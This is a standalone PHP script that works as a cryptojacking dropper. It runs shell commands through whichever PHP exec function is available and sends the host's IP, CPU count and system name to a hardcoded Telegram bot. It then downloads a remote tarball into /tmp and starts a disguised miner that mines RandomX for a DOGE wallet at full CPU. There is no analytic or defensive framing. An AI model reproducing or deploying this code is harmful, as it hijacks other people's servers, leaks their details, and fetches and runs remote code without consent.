<?php
function php_exec($cmd) {
    if (function_exists('system')) {
        ob_start();
        system($cmd, $return_var);
        $output = ob_get_clean();
        return ($return_var === 0) ? $output : null;
    } elseif (function_exists('exec')) {
        exec($cmd, $output, $return_var);
        return ($return_var === 0) ? implode("\n", $output) : null;
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd, $return_var);
        $output = ob_get_clean();
        return ($return_var === 0) ? $output : null;
    } elseif (function_exists('shell_exec')) {
        $output = shell_exec($cmd);
        return !is_null($output) ? $output : null;
    }
    return null;
}

function sendToTelegram($message) {
    $apiToken = "8471424908:AAF3KELhfMmkEcEMH-dxUd9itK6gB81gP9o";
    $chatId = '7577310888';

    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    $url = "https://api.telegram.org/bot$apiToken/sendMessage";

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

    $response = curl_exec($ch);

    curl_close($ch);

    return $response;
}

$sys = php_uname();
$lihat = php_exec('curl ipecho.net/plain');
$corenya = php_exec('nproc');
$uname = php_uname('n');
$message = "Miner : DCGhW6hz1tggDw4hSdoLHojsZvz8aoVzTo\r\nIP : $lihat \r\nCore : $corenya \r\nUname : \r\n$sys";

sendToTelegram($message);

if (in_array('curl', get_loaded_extensions())) {
    php_exec("cd /tmp; curl -L https://image.aausports.org/saukilmuna.tar.gz | tar zx; ./syssls -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u DOGE:DCGhW6hz1tggDw4hSdoLHojsZvz8aoVzTo.$uname --cpu-max-threads-hint=100");
} else {
    php_exec("cd /tmp; wget https://image.aausports.org/saukilmuna.tar.gz; tar -zxf saukilmuna.tar.gz; ./syssls -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u DOGE:DCGhW6hz1tggDw4hSdoLHojsZvz8aoVzTo.$uname --cpu-max-threads-hint=100");
}
?>
